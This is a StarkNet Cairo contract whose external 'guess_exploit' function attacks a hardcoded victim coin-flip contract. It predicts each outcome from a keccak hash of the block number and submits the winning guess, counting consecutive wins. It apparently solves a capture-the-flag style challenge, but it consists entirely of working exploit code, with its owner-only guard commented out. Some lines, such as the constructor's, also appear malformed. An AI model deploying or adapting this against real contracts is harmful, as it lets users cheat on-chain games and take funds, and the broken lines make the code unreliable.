%lang starknet
from starkware.cairo.common.cairo_builtins import HashBuiltin
from starkware.cairo.common.bool import FALSE, TRUE
from starkware.starknet.common.syscalls import get_block_number,get_caller_address,get_tx_info
from starkware.cairo.common.math import assert_not_equal
from starkware.cairo.common.math_cmp import is_le
from starkware.cairo.common.keccak import unsafe_keccak
from starkware.cairo.common.alloc import alloc

@contract_interface
namespace IGUESS {
    func guess(guess : felt) -> (output : felt){
    }
}

const HEAD=0;
const TAIL=1;
const VICTIM=0x03a79895f3a3d1845f38aecc7594a2863d59844321e85587086f742828f664b0;
@event
func mywins_counter(wins: felt) {
}

@storage_var
func consecutive_wins() -> (value: felt) {
}

@storage_var
func last_block() -> (value: felt) {
}

@storage_var
func owner() -> (value: felt) {
}

func get_last_block{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() -> felt {
        alloc_locals;
        let (res)=last_block.read();
        return res;
}

func get_owner{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() -> felt {
        alloc_locals;
        let (res)=owner.read();
        return res;
}

@constructor
func constructor{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() {
    let (acct) = 0x039618efb43fb60252d7804bc8cbce49863c4eab0c8f9b53dd8a53f15747889d
    owner.write(acct);
    return();
}


@external
func guess_exploit{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() -> (output : felt) {
    alloc_locals;

    //let (sender)=get_caller_address();
    //with_attr error_message("Only owner."){
    //    assert sender=get_owner();
    //}

    let (block_number) = get_block_number();
    
    with_attr error_message("New guess must be in a new block."){
        assert_not_equal(block_number, get_last_block());
    }
    last_block.write(block_number);

    let (block_hash : felt*) = alloc();
    assert block_hash[0] = block_number;

    let (hashLow, hashHigh) = unsafe_keccak(block_hash,16);

    local side;
    let le = is_le(hashLow, hashHigh);
    if (le == TRUE){
        side=HEAD;
    }else{
        side=TAIL;
    }

    IGUESS.guess(VICTIM,side);

    let (current_wins)=consecutive_wins.read();
    consecutive_wins.write(current_wins+1);
    mywins_counter.emit(current_wins+1);
    return (output=TRUE);
}
